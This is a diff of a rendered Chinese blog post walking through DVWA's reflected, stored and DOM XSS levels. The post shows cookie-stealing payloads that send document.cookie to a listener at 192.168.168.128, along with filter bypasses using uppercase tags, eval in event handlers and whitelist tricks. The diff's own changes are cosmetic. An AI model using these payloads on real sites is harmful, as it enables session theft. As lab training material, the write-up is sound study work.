@@ -472,14 +472,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    978
+                    1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    5 分
                 </div>
                 
 
@@ -503,7 +503,7 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>从MRCTF的那道XSS之后感觉对XSS的实战太陌生了，回来靶场练基本功，先从dvwa开始吧。网上的答案什么的全是测一下能否弹窗然后就结束了，太简单了，这一次练习必须所有题目都可以偷到cookie！<span id="more"></span></p>
-<h2 id="0x01-反射型"><a href="#0x01-反射型" class="headerlink" title="0x01 反射型"></a>0x01 反射型</h2><p> <img src="/../images/1592114-20190411201659763-947904709.png" alt="img"> </p>
+<h2 id="0x01-反射型"><a href="#0x01-反射型" class="headerlink" title="0x01 反射型"></a>0x01 反射型</h2><p> <img src="images/1592114-20190411201659763-947904709.png" alt="img"> </p>
 <p>1.low等级</p>
 <p>源代码</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
@@ -517,7 +517,6 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>没有任何过滤。直接偷cookie！ip地址是接收cookie的服务器地址，在上面写了一个php脚本接收cookie并保存起来。代码如下：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
  highlight_file(&#39;index.php&#39;);
@@ -534,12 +533,10 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39;
     fclose($handler);   
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>payload：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://192.168.168.128?joke='</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p>接收到的cookie：<img src="/../images/1651119707909.png" alt="1651119707909"></p>
+<p>接收到的cookie：<img src="images/1651119707909.png" alt="1651119707909"></p>
 <p>2.medium等级</p>
 <p>源代码：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">
@@ -557,8 +554,7 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39;
 <span class="token punctuation">&#125;</span>
 
 <span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>仅仅只是把”<script>"标签过滤了，这里选择用其他标签吧。</p>
+<p>仅仅只是把”<script>“标签过滤了，这里选择用其他标签吧。</p>
 <p>payload：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">"test"</span><span class="token operator">></span>
 	<span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token string">'http://192.168.168.128?joke='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
@@ -566,8 +562,7 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39;
 	img<span class="token punctuation">.</span>src <span class="token operator">=</span> a<span class="token punctuation">;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
  <span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>接收到的cookie：<img src="/../images/1651119884508.png" alt="1651119884508"></p>
+<p>接收到的cookie：<img src="../images/1651119884508.png" alt="1651119884508"></p>
 <p>3.high等级</p>
 <p>源代码：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
@@ -584,15 +579,13 @@ if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39;
 <span class="token punctuation">&#125;</span>
 
 <span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>对script标签的正则替换。跟medium一样等级的payload也能过，但是这里用别的标签展示一下🤭</p>
 <p>payload：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div id<span class="token operator">=</span><span class="token string">'test'</span><span class="token operator">></span>
     <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://192.168.168.128?joke='</span><span class="token operator">+</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">;</span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">></span>
 <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">''</span> onclick<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span>innerText<span class="token punctuation">)</span><span class="token operator">></span>click<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/1651120171676.png" alt="1651120171676"></p>
+<p><img src="../images/1651120171676.png" alt="1651120171676"></p>
 <p>只要能够执行js代码，一切就没有问题0.0</p>
 <h2 id="0x02-存储型"><a href="#0x02-存储型" class="headerlink" title="0x02 存储型"></a>0x02 存储型</h2><p>1.low等级</p>
 <p>源代码：</p>
@@ -618,24 +611,20 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
 &#125;
 
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>总结一下代码做的事情：1）接收三个post参数，并去除其中两个的前后空格，调用stripslashes去除反斜杠。</p>
 <p>2）mysqli_real_escape_string转义字符串中特殊字符，最后更新数据库</p>
 <p>明显的xss了，去除反斜杠没什么影响，而转义字符只是存进去，拿出来的时候该有的特殊字符还是存在= =</p>
 <p>payload：</p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script <span class="token keyword">new</span> <span class="token class-name">Image</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>src<span class="token operator">=</span><span class="token string">'http://192.168.168.128?joke='</span><span class="token operator">+</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>
 <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/1651131695987.png" alt="1651131695987"></p>
+<p><img src="../images/1651131695987.png" alt="1651131695987"></p>
 <p>2.medium等级</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">$name &#x3D; str_replace( &#39;&lt;script&gt;&#39;, &#39;&#39;, $name );<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p>将script标签换为空，双写绕过，大写绕过或者改用其他标签，跟第一关payload一致。</p>
 <p>payload</p>
 <pre class="line-numbers language-none"><code class="language-none">&lt;SCRIPT new Image().src&#x3D;&#39;http:&#x2F;&#x2F;192.168.168.128?joke&#x3D;&#39;+encodeURIComponent(document.cookie);&gt;
 &lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-
-<p><img src="/../images/1651131863425.png" alt="1651131863425"></p>
+<p><img src="../images/1651131863425.png" alt="1651131863425"></p>
 <p>3.high等级</p>
 <p>源码不放了，跟反射性几乎没有区别，就多了存储数据的操作。</p>
 <p>payload跟第一关的高等级应该一样，我没有测试。</p>
@@ -643,10 +632,10 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
 <p>1.low等级</p>
 <p>看源码就知道低等级是没有保护的，随便拿以上payload就可以注入</p>
 <p>2.medium等级</p>
-<p>此等级过滤 了<script，简单的令人心慌，一样的答案</p>
+<p>此等级过滤 了&lt;script，简单的令人心慌，一样的答案</p>
 <p>3.high等级</p>
 <p>这一关整了一个白名单，看似很安全，实则不然。</p>
-<p> 可以考虑在English后面使用&或者# </p>
+<p> 可以考虑在English后面使用&amp;或者# </p>
 <pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">English<span class="token operator">&amp;</span><span class="token operator">&lt;</span>script<span class="token operator">></span>前面的payload<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></script></p>
                 
             </div>
@@ -901,7 +890,6 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
                     <div class="summary block-with-text">
                         
                             
-
 对 XSS 作一个总结
                         
                     </div>
@@ -1029,7 +1017,7 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1041,7 +1029,7 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1170,7 +1158,7 @@ if( isset( $_POST[ &#39;btnSign&#39; ] ) ) &#123;
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
